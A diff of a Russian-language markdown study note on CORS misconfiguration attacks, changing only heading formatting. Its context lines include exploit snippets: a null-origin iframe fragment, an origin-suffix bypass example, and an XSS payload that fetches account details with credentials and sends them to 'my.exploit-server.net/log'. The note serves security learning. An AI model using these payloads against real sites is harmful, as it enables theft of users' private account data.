@@ -24,7 +24,7 @@ SOP определяет права доступа на основе origin.
 
 # Уязвимости, возникающие из-за проблем с конфигурацией CORS
 
-* **Сгенерированный сервером заголовок ACAO из указанного клиентом заголовка Origin**
+### **Сгенерированный сервером заголовок ACAO из указанного клиентом заголовка Origin**
 
 ```
 <script>
@@ -40,7 +40,7 @@ SOP определяет права доступа на основе origin.
 </script>
 ```
 
-* **Ошибки при анализе заголовков источника**
+### **Ошибки при анализе заголовков источника**
 
 * Приложение предоставляет доступ ко всем доменам, заканчивающимся на
 normal-website.com
@@ -56,7 +56,7 @@ normal-website.com
 normal-website.com.evil-user.net
 ```
 
-* **Белый список пустого источника**
+### **Белый список пустого источника**
 
 Спецификация заголовка Origin поддерживает значение null. Браузеры могут отправлять значение null в заголовке Origin в различных необычных ситуациях:
 
@@ -77,11 +77,11 @@ normal-website.com.evil-user.net
     };
 </script>"></iframe>
 ```
-* **Эксплуатация XSS через доверительные отношения CORS**
+### **Эксплуатация XSS через доверительные отношения CORS**
 
 * Если веб-сайт доверяет источнику, который уязвим для межсайтового скриптинга (XSS), можно использовать XSS для внедрения некоторого JavaScript, который использует CORS для получения конфиденциальной информации с сайта, который доверяет уязвимому приложению.
 
-* **Взлом TLS с плохо настроенным CORS**
+### **Взлом TLS с плохо настроенным CORS**
 
 * Пользователь-жертва делает любой простой HTTP-запрос.
 
@@ -106,7 +106,7 @@ http://trusted-subdomain.vulnerable-website.com
     document.location="http://victim-server.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://victim-server/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://my.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
 </script>
 ```
-* **Интрасети и CORS без учетных данных**
+### **Интрасети и CORS без учетных данных**
 
 Большинство атак CORS полагаются на наличие заголовка ответа:
 Access-Control-Allow-Credentials: true
